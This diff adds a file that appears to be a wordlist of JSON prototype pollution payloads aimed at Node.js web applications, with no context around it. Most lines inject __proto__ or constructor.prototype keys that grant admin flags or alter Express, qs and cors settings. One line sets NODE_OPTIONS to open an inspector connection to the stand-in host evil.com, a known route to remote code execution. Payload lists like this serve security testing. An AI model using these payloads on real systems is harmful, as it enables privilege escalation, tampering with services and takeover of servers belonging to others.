@@ -1,0 +1,13 @@
+{"__proto__":{"admin":true}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"isadmin":1}}
+{"constructor":{"prototype":{"admin":true}}}
+{"__proto__":{"json spaces":"  "}}
+{"__proto__":{"status":510}}
+{"__proto__":{"parameterLimit":1}}
+{"__proto__":{"ignoreQueryPrefix":true}}
+{"__proto__":{"allowDots":true}}
+{"__proto__":{"exposedHeaders":["x-admin"]}}
+{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=evil.com"}}
+{"constructor":{"prototype":{"isAdmin":true}}}
